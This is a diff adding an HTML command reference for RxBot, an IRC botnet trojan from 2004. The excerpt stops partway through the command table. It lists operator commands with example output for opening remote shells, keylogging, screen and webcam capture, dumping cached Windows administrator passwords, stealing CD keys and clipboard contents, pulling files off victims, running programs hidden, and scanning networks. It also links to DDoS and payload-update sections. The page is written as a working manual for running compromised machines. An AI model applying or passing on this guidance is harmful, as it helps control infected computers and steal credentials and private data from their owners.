@@ -1,0 +1,1249 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "DTD/xhtml1-strict.dtd"><html><head><title>Rxbot Commands</title>
+
+<meta content="text/html; charset=iso-8859-1" http-equiv="Content-Type">
+<meta content="" name="description">
+<meta content="muzzleflash,bitterman,muzzleflash.org,flash,de_dust" name="keywords">
+<link type="text/css" href="_files/styles.htm" rel="stylesheet">
+<script src="_files/fusion.htm" type="text/javascript"></script>
+<style type="text/css">
+
+TD {
+	BORDER-RIGHT: gray 1px solid; PADDING-RIGHT: 1px; BORDER-TOP: gray 1px solid; PADDING-LEFT: 7px; PADDING-BOTTOM: 4px; VERTICAL-ALIGN: top; BORDER-LEFT: gray 1px solid; PADDING-TOP: 3px; BORDER-BOTTOM: gray 1px solid
+}
+
+.headers {
+	BORDER-RIGHT: gray 1px solid; PADDING-RIGHT: 0px; BORDER-TOP: gray 1px solid; PADDING-LEFT: 5px; FONT-WEIGHT: bold; FONT-SIZE: 120%;  PADDING-BOTTOM: 1px; BORDER-LEFT: gray 1px solid; PADDING-TOP: 0px; BORDER-BOTTOM: gray 1px solid
+}
+.user {
+	COLOR: #0000fc
+}
+.bot {
+	COLOR: #009300
+}
+</style><meta name="GENERATOR" content="MSHTML 6.00.2800.1400"></head>
+
+<body text="#bbbbbb" bgcolor="#000000">
+<table style="border: 1px solid rgb(85, 85, 85);" cellpadding="0" cellspacing="0" width="90%" align="center">
+<tbody><tr>
+<td>
+<table cellpadding="0" cellspacing="0" width="100%">
+<tbody><tr>
+</tr>
+</tbody></table>
+<table cellpadding="0" cellspacing="0" width="100%">
+
+<tbody><tr><td class="white-header" align="right">
+</td></tr>
+</tbody></table>
+<table cellpadding="0" cellspacing="0" width="100%">
+<tbody><tr>
+<td class="slborder" valign="top" width="170">
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+</tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+</tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+</tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+</tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+</tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+
+</tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+</tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+
+</tr>
+</tbody></table>
+</td>
+<td class="bodybg" valign="top">
+<table class="border" cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+<td>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+<td class="capmain">Rxbot Commandlist<br>
+</td></tr>
+</tbody></table>
+<table cellspacing="0" cellpadding="0" width="100%">
+<tbody><tr>
+<td class="body">
+
+
+
+<div style="width: 100%; text-align: center;"><span style="font-weight: bold; font-size: 200%;">Command Reference</span> 
+<p style="margin: 0px 0px 7px;"><span style="font-size: 80%;">For RxBot <br>
+<br>By  URXBOTTEAM :) (2004)</span></p>
+<p style="font-weight: bold; font-size: 80%;"><a href="#general_commands">General 
+Commands</a> - <a href="#scanning">Scanning 
+Functions</a> - <a href="#clones">Clones</a> 
+- <a href="#ddos">DDoS 
+Functions</a> - <a href="#download_update">Downloading 
+&amp; Updating</a> - <a href="#redirecting">Redirecting</a> 
+- <a href="#ftp">FTP 
+Functions</a> </p></div>
+<table cellspacing="2" style="width: 100%;">
+  <tbody>
+  <tr>
+    <td style="width: 12%;" class="headers">Command Name</td>
+    <td style="width: 5%;" class="headers">Alias</td>
+    <td style="width: 26%;" class="headers">Syntax</td>
+    <td style="width: 26%;" class="headers">Command Information</td>
+    <td style="width: 31%;" class="headers">Example</td></tr><!--
+General Commands
+-->
+  <tr>
+    <td class="headers"><a name="general_commands" href="http://jarryd.onestop.net/bottom.php?server=jarryd.onestop.net&amp;file=/rxbot-howto.html#general_commands">General Commands</a></td></tr>
+  <tr>
+    <td>action </td>
+    <td>a </td>
+    <td>.a <channel> <message> </message></channel></td>
+    <td>Causes a action to <channel> with <message>. </message></channel></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .action #channel implodes 
+      irrationally<br>[In #channel...]<br>* ]URXBOTBot[-32315 implodes 
+irrationally<br></td></tr><!-- 
+addalias
+-->
+  <tr>
+    <td>addalias </td>
+    <td>aa </td>
+    <td>.aa <alias name=""> <command> </command></alias></td>
+    <td>Add an alias by the name of <alias name=""> and executes 
+      <command> when called. </command></alias></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .addalias hello privmsg $chan 
+      hello<br>&lt;<span class="user">@URXBOT</span>&gt; .hello<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; hello<br></td></tr><!-- 
+aliases 
+-->
+  <tr>
+    <td>aliases </td>
+    <td>al </td>
+    <td>.aliases </td>
+    <td>Displays all the current aliases (if any). </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .aliases<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; -[alias list]-<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 0. opme = mode $chan +o $user<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 1. spastic = syn $1 445 120 </td></tr><!-- 
+capture 
+-->
+  <tr>
+    <td>capture </td>
+    <td>cap </td>
+    <td><b>Screenshot</b><br>.capture screen <filename><br><b>Webcam 
+      Image</b><br>.capture frame <filename> (input no.) 
+      <width> <height><br><b>Video</b><br>.capture video 
+      <filename> (input no.) <length> <width> 
+      <height> </height></width></length></filename></height></width></filename></filename></td>
+    <td>Generates an image of the what ever requested. Can be from a webcam, 
+      desktop or even make a movie from a webcam. (Generates a ~3MB file for 
+      screenshots) </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .capture screen 
+      C:\Screenshot.jpg<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [CAPTURE]: 
+      Screen capture saved to: C:\Screenshot.jpg. </td></tr><!-- 
+clearlog 
+-->
+  <tr>
+    <td>clearlog </td>
+    <td>clg </td>
+    <td>.clearlog </td>
+    <td>Clears whatever has been logged since the start. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .clearlog<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [LOGS]: Cleared. </td></tr><!-- 
+clone 
+-->
+  <tr>
+    <td>clone </td>
+    <td>c </td>
+    <td>.clone <server> </server><port> <channel> [channel key] </channel></port></td>
+    <td>Creates a clone on the server in the channel specified. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .clone irc.easynews.com 6667 
+      #moose<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [CLONES]: Created on 
+      irc.easynews.com:6667, in channel #moose. </td></tr><!--
+cmd 
+-->
+  <tr>
+    <td>cmd </td>
+    <td>cm </td>
+    <td>.cmd <remote command=""> </remote></td>
+    <td>Sends <command> to an open remote console. </command></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .cmd dir<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [CMD]: Commands: dir </td></tr><!-- 
+cmdstop 
+-->
+  <tr>
+    <td>cmdstop </td>
+    <td>  </td>
+    <td>.cmdstop </td>
+    <td>Stops a remote console. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .cmdstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [CMD] Remote shell stopped. (1 thread(s) 
+      stopped) </td></tr><!-- 
+crash 
+-->
+  <tr>
+    <td>crash </td>
+    <td>  </td>
+    <td>.crash </td>
+    <td>Crashes the bot. Don't ask me why it's in here, but it is. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .crash<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Crashing bot. </td></tr><!-- 
+currentip
+-->
+  <tr>
+    <td>currentip </td>
+    <td>cip </td>
+    <td>.currentip [thread number] </td>
+    <td>Returns the current IP scanning, or IP from the [thread number]. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .currentip<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SCAN]: Scanning IP: 24.222.212.37, Port: 139. 
+    </td></tr><!-- 
+cycle 
+-->
+  <tr>
+    <td>cycle </td>
+    <td>cy </td>
+    <td>.cycle <delay> <channel> [key] </channel></delay></td>
+    <td>Parts <channel>, waits <delay> seconds and joins again 
+      with [key]. </delay></channel></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .cycle 5 #help<br>* ]URXBOTBot[-32315 has 
+      left the channel.<br> [5 seconds later...]<br>* ]URXBOTBot[-32315 has joined the 
+      channel. </td></tr><!-- 
+delay 
+-->
+  <tr>
+    <td>delay </td>
+    <td>de </td>
+    <td>.delay <number seconds="" in=""> <command> </command></number></td>
+    <td>Sleeps for <seconds> and then executes <command> </command></seconds></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .delay 10 .quit<br>[10 seconds 
+      later...]<br>* ]URXBOTBot[-32315 has quit (Quit: later) </td></tr><!-- 
+delete
+-->
+  <tr>
+    <td>delete </td>
+    <td>del </td>
+    <td>.delete <file> </file></td>
+    <td>Removes <file>. </file></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .delete 
+      C:\Screenshot.jpg<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [FILE]: Deleted 
+      'C:\Screenshot.jpg'. </td></tr><!-- 
+die 
+-->
+  <tr>
+    <td>die </td>
+    <td>  </td>
+    <td>.die </td>
+    <td>Kills all the threads and the bot, does not perform any clean up 
+      actions. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .die<br>* ]URXBOTBot[-32315 has quit (Quit: 
+      Connection Reset by Peer) </td></tr><!-- 
+disconnect 
+-->
+  <tr>
+    <td>disconnect </td>
+    <td>dc </td>
+    <td>.disconnect </td>
+    <td>Disconnects the bot from the server, but keeps the process running. 
+      Reconnects 30 minutes later. (No threads are killed). </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .disconnect<br>* ]URXBOTBot[-32315 has quit 
+      (Quit: later.) </td></tr><!--
+dns 
+-->
+  <tr>
+    <td>dns </td>
+    <td>  </td>
+    <td>.dns <ip> </ip></td>
+    <td>Resolves <ip>. </ip></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .dns 
+      www.google.com<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [DNS]: Lookup: 
+      www.google.com -&gt; 216.239.33.101. </td></tr><!-- 
+driveinfo
+-->
+  <tr>
+    <td>driveinfo </td>
+    <td>drv </td>
+    <td>.driveinfo </td>
+    <td>Returns total, free, and used space on all available drives. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .driveinfo<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Disk Drive (C:\): 10,506,476KB total, 
+      4,456,888KB free, 4,456,888KB available.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Cdrom Drive (D:\): Failed to stat, 
+      device not ready. </td></tr><!--
+email
+-->
+  <tr>
+    <td>email </td>
+    <td>  </td>
+    <td>email <server> </server><port> <sender> <to> 
+      <subject> </subject></to></sender></port></td>
+    <td>Sends an email to <to> from <sender> with <subject> 
+      using <server>:</server><port> </port></subject></sender></to></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .email pop3.hotmail.com 110 
+      linus@linux.org bill@microsoft.com Linux &gt; Microsoft<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [EMAIL]: Message sent to bill@microsoft.com. 
+  </td></tr><!--
+encrypt
+-->
+  <tr>
+    <td>encrypt </td>
+    <td>enc </td>
+    <td>.encrypt </td>
+    <td>I'm not sure what this actually does. From what I read, it encrypts 
+      something, but only when DUMP_ENCRYPT is enabled. It may even dump out the 
+      config file encrypted... </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .encrypt<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; SOMETHING HERE! </td></tr><!--
+execute
+-->
+  <tr>
+    <td>execute </td>
+    <td>e </td>
+    <td>.execute <visibilty> <file> </file></visibilty></td>
+    <td>Runs <file>. If visibility is 1, runs the program visible, and 0 
+      runs it hidden. </file></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .execute 1 
+      notepad.exe<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SHELL]: File opened: 
+      notepad.exe </td></tr><!--
+findfile
+-->
+  <tr>
+    <td>findfile </td>
+    <td>ff </td>
+    <td>.findfile <wildcard> [directory] </wildcard></td>
+    <td>Searches for <wildcard> in the active directory (or [directory]) 
+      and returns the results. </wildcard></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .findfile *screenshot* 
+      c:\<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [FINDFILE]: Searching for 
+      file: *screenshot*.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; Found: 
+      C:\Screenshot.jpg<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [FINDFILE]: 
+      Files found: 1. </td></tr><!--
+findfilestop
+-->
+  <tr>
+    <td>findfilestop </td>
+    <td>ffstop </td>
+    <td>.findstop </td>
+    <td>Stops searching for a file. (Pointless though, as there is already a 
+      loop going and it won't be able to stop this loop until it has finished. 
+      So be warned, don't use findfile :-P) </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .findfilestop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [FINDFILE] Find file stopped. (1 thread(s) 
+      stopped) </td></tr><!--
+findpass
+-->
+  <tr>
+    <td>findpass </td>
+    <td>fp </td>
+    <td>.findpass </td>
+    <td>FindPass decodes and displays administrator logon credentials from 
+      Winlogon in Win2000 / Winnt4 + &lt; sp6. Windows 2000 and Windows NT 
+      administrator passwords are CACHED by WinLogon using the Microsoft 
+      Graphical Identification and Authentication (MSGINA.DLL) module. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .findpass<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [FINDPASS]: The Windows logon (Pid: 
+      &lt;111&gt;) information is: Domain: \\Windows, User: (Bill Gates/(no 
+      password)). </td></tr><!--
+flusharp
+-->
+  <tr>
+    <td>flusharp </td>
+    <td>farp </td>
+    <td>.flusharp </td>
+    <td>Flushes the ARP cache (what ever use that is). </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .flusharp<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [FLUSHDNS]: ARP cache flushed. </td></tr><!--
+flushdns
+-->
+  <tr>
+    <td>flushdns </td>
+    <td>fdns </td>
+    <td>.flushdns </td>
+    <td>Flushes the DNS cache (what ever use that is). </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .flushdns<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [FLUSHDNS]: DNS cache flushed. </td></tr><!--
+get
+-->
+  <tr>
+    <td>get </td>
+    <td>gt </td>
+    <td>.get <file> </file></td>
+    <td>Sends a file via DCC. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .get 
+      C:\Screenshot.jpg<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [DCC]: Send 
+      File: C:\Screenshot.jpg, User: moose. </td></tr><!--
+getcdkeys
+-->
+  <tr>
+    <td>getcdkeys </td>
+    <td>key </td>
+    <td>.getcdkeys </td>
+    <td>Returns keys of products installed on the computer. Includes games and 
+      Microsoft products. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .getcdkeys<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; Microsoft Windows Product ID CD Key: 
+      (11111-640-1111111-11111)<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 
+      [CDKEYS]: Search completed. </td></tr><!--
+getclip
+-->
+  <tr>
+    <td>getclip </td>
+    <td>gc </td>
+    <td>.getclip </td>
+    <td>Prints out whatever is in the clipboard at that time. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .getclip<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; -[Clipboard Data]-<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; http://www.goat.cx </td></tr><!--
+gethost
+-->
+  <tr>
+    <td>gethost </td>
+    <td>gh </td>
+    <td>.gethost <search hostname="" for=""> [command] </search></td>
+    <td>Searches for wildcard in hostname, if true, executes commands. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .gethost 
+      microsoft.com<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [NETINFO]: [Type]: 
+      LAN (LAN Connection). [IP Address]: 207.46.134.155. [Hostname]: 
+      microsoft.com. </td></tr><!--
+httpcon
+-->
+  <tr>
+    <td>httpcon </td>
+    <td>hcon </td>
+    <td>.hcon <host> <port> <method> <file> 
+      <referrer> </referrer></file></method></port></host></td>
+    <td>Connects to <host>:<port> with <method> 
+      <file>, using <referrer> as it's referrer. (Has a tendancy to 
+      crash the bot, don't ask me why). </referrer></file></method></port></host></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .httpcon 24.222.212.37 80 GET / 
+      http://www.google.com<br>*crashes* </td></tr><!--
+httpstop
+-->
+  <tr>
+    <td>httpstop </td>
+    <td>  </td>
+    <td>.httpstop </td>
+    <td>Stops the webserver running on the port in config.h. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .httpstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [HTTPD]: Server stopped. (1 thread(s) stopped.) 
+    </td></tr><!--
+httpserver
+-->
+  <tr>
+    <td>httpserver </td>
+    <td>http </td>
+    <td>.httpserver [port] [directory] </td>
+    <td>Starts a webserver on the port specified in config.h, and with a root 
+      dir of C:\. Uses alternative options if specified. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .http<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [HTTPD]: Server listening on IP: 
+      216.239.33.101:81, Directory: \. </td></tr><!--
+id
+-->
+  <tr>
+    <td>id </td>
+    <td>i </td>
+    <td>.id </td>
+    <td>Returns the ID. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .id<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; ]URXBOTBot[-32315-toe. </td></tr><!--
+identd
+-->
+  <tr>
+    <td>identd </td>
+    <td>identd </td>
+    <td>.id <on |off=""> </on></td>
+    <td>Stops or starts the Identd server running. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .identd on<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [IDENTD]: Server running on Port: 113. </td></tr><!--
+join
+-->
+  <tr>
+    <td>join </td>
+    <td>j </td>
+    <td>.join <channel> [key] </channel></td>
+    <td>Joins <channel> (with [key]). </channel></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .join #chat<br>[In #chat...] * 
+      ]URXBOTBot[-32315 has joined #chat </td></tr><!--
+keylog
+-->
+  <tr>
+    <td>keylog </td>
+    <td>  </td>
+    <td>.keylog <on |off=""> </on></td>
+    <td>A working keylogger. Outputs any input to file specified in config.h 
+    </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .keylog on<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [KEYLOG]: Key logger active.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [KEYLOG]: (Changed Windows: C:\) </td></tr><!--
+kill
+-->
+  <tr>
+    <td>kill </td>
+    <td>ki </td>
+    <td>.kill <pid> </pid></td>
+    <td>Kills a process according to it's PID. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .kill 4<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [PROC]: Process killed ID: 4 </td></tr><!--
+killproc
+-->
+  <tr>
+    <td>killproc </td>
+    <td>kp </td>
+    <td>.killproc <process name=""> </process></td>
+    <td>Kills a process according to it's name. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .kill system.exe<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [PROC]: Process killed: system.exe </td></tr><!--
+killthread
+-->
+  <tr>
+    <td>killthread </td>
+    <td>k </td>
+    <td>.killthread <all number="" |thread=""> </all></td>
+    <td>Kills an internal thread. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .killthread 1<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [THREADS]: Killed thread: 1 </td></tr><!--
+list
+-->
+  <tr>
+    <td>list </td>
+    <td>li </td>
+    <td>.list <wildcard> </wildcard></td>
+    <td>List and searches for files using wildcard. (NB: Must be *wildcard*) 
+    </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .list *cmd*<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; Searching for: *cmd*<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; login.cmd 08/23/2001 09:30 PM (487 
+      bytes)<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; Found 1 Files and 0 
+      Directories<br></td></tr><!--
+log
+-->
+  <tr>
+    <td>log </td>
+    <td>lg </td>
+    <td>.log </td>
+    <td>Returns the log since it began. Contains: commands, logins, logouts 
+      and connections. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .list *cmd*<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [LOG]: Begin <br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [06-04-2004 22:35:33] [MAIN]: User: moose 
+      logged in.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [06-04-2004 20:49:35] 
+      [MAIN]: Joined channel: #moose.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 
+      [06-04-2004 20:49:35] [IDENTD]: Client connection from IP: 
+      24.222.212.37:22400.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [06-04-2004 
+      20:49:35] [MAIN]: Connected to irc.microsoft.com.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [06-04-2004 20:49:35] [IDENTD]: Server running 
+      on Port: 113.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [06-04-2004 
+      20:49:35] [MAIN]: Bot started.<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 
+      [LOG]: List complete. </td></tr><!--
+login
+-->
+  <tr>
+    <td>login </td>
+    <td>l </td>
+    <td>.login <password> </password></td>
+    <td>Logs a user in if the password is the same as the one in config.h. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .login xxxxxx<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Password accepted. </td></tr><!--
+logout
+-->
+  <tr>
+    <td>logout </td>
+    <td>lo </td>
+    <td>.logout [slot] </td>
+    <td>Logs out the user, it can also be used to log out other in active 
+      users. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .who<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; -[Login List]-<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 0. moose!moose@internet.yahoo.com<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 1. 
+      antelope!deer@i-own.blogspot.com<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 
+      2. <empty><br>&lt;<span class="user">@URXBOT</span>&gt; .logout 
+      1<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: User antelope logged out 
+    </empty></td></tr><!--
+logstop
+-->
+  <tr>
+    <td>logstop </td>
+    <td>  </td>
+    <td>.logstop </td>
+    <td>Stops listing the log. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .logstop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [LOG]: Log list stopped. (1 thread(s) stopped.) 
+    </td></tr><!--
+mirccmd
+-->
+  <tr>
+    <td>mirccmd </td>
+    <td>mirc </td>
+    <td>.mirc <command> </command></td>
+    <td>If a mIRC window is open, it will be feed through it as if you would 
+      have typed it manually. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .mirccmd //scon -a ame is 
+      bored<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [mIRC]: Command sent.<br>[In 
+      every of the user's channels...]<br>* tomorrow is bored </td></tr><!--
+mode
+-->
+  <tr>
+    <td>mode </td>
+    <td>m </td>
+    <td>.mode <channel> <modes> </modes></channel></td>
+    <td>Changes modes in <channel> </channel></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .mode #help +o moose<br>[In 
+      #help...]<br>* ]URXBOTBot[-32315 sets mode +o moose </td></tr><!--
+ net
+-->
+  <tr>
+    <td>net </td>
+    <td>  </td>
+    <td>.net <command> [<service>/<share name="">/<username>] [<resource>/<password>] [-d] </password></resource></username></share></service></command></td>
+    <td>A basic net.exe. </td>
+    <td><a href="http://jarryd.onestop.net/bottom.php?server=jarryd.onestop.net&amp;file=/rxbot-howto.html#net_help">Net 
+      help</a> </td></tr><!--
+ netinfo
+-->
+  <tr>
+    <td>netinfo </td>
+    <td>ni </td>
+    <td>.netinfo </td>
+    <td>Returns network and IP information. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .netinfo<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [NETINFO]: [Type]: LAN (LAN Connection). [IP 
+      Address]: 207.46.134.155. [Hostname]: microsoft.com. </td></tr><!--
+nick
+-->
+  <tr>
+    <td>nick </td>
+    <td>n </td>
+    <td>.nick <new nick=""> </new></td>
+    <td>Changes nickname to the new one specified. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .nick marker<br>* ]URXBOTBot[-32315 is now 
+      know as marker </td></tr><!--
+open
+-->
+  <tr>
+    <td>open </td>
+    <td>o </td>
+    <td>.open <file> </file></td>
+    <td>Unlike execute, this isn't just limited to programs. Open can open web 
+      browsers and images. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .open 
+      http://www.mozilla.org/products/firefox<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [SHELL]: File opened: 
+      http://www.mozilla.org/products/firefox </td></tr><!--
+opencmd
+-->
+  <tr>
+    <td>opencmd </td>
+    <td>ocmd </td>
+    <td>.opencmd </td>
+    <td>Executes a remote shell. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .opencmd<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [CMD]: Remote shell ready. </td></tr><!--
+part
+-->
+  <tr>
+    <td>part </td>
+    <td>pt </td>
+    <td>.part <channel> </channel></td>
+    <td>Parts <channel> </channel></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .part #help<br>[In 
+      #help...]<br>* Parts: ]URXBOTBot[-32315 </td></tr><!--
+prefix
+-->
+  <tr>
+    <td>prefix </td>
+    <td>pr </td>
+    <td>.prefix <new prefix=""> </new></td>
+    <td>Changes the command prefix to the new one (up until the bot is 
+      restarted). </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .prefix ?<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [MAIN]: Prefix changed to: '?'.<br>&lt;<span class="user">@URXBOT</span>&gt; ?ni<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; 
+      [NETINFO]: [Type]: LAN (LAN Connection). [IP Address]: 207.46.134.155. 
+      [Hostname]: microsoft.com. </td></tr><!--
+psniff
+-->
+  <tr>
+    <td>psniff </td>
+    <td>  </td>
+    <td>.psniff <on |off=""> [channel to output to] </on></td>
+    <td>A very buggy packet sniffer, gets into loop with the error messages. 
+      Not recommended to be using this. </td>
+    <td>  </td></tr><!--
+privmsg
+-->
+  <tr>
+    <td>privmsg </td>
+    <td>pm </td>
+    <td>.privmsg <channel> <message> </message></channel></td>
+    <td>Messages <channel> with <message>. </message></channel></td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .privmsg #chat Hello 
+      lusers.<br>[In #Chat...]<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; Hello 
+      lusers. </td></tr><!--
+procs
+-->
+  <tr>
+    <td>procs </td>
+    <td>ps </td>
+    <td>.procs </td>
+    <td>Lists all the current processes. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .procs<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [PROC]: Listing processes:<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; System (4)<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; smss.exe (380)<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; csrss.exe (436)<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [PROC]: Process list completed.<br>etc. </td></tr><!--
+process_stop
+-->
+  <tr>
+    <td>process_stop </td>
+    <td>p_stop </td>
+    <td>.process_stop </td>
+    <td>Stops listing the processes </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .process_stop<br>&lt;<span class="bot">]URXBOTBot[-32315</span>&gt; [PROC]: Process list stopped. (1 thread(s) 
+      stopped.) </td></tr><!--
+quit
+-->
+  <tr>
+    <td>quit </td>
+    <td>q </td>
+    <td>.quit [message] </td>
+    <td>Quits (if specified, with a message), kills all threads and closes. 
+</td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .quit<br>* ]URXBOTBot[-32315 quit (Quit: 
+      later) </td></tr><!--
+raw
+-->
+  <tr>
+    <td>raw </td>
+    <td>r </td>
+    <td>.raw <raw> </raw></td>
+    <td>Sends a raw to the server. </td>
+    <td>&lt;<span class="user">@URXBOT</span>&gt; .raw QUIT :what.<br>* ]URXBOTBot[-32315 
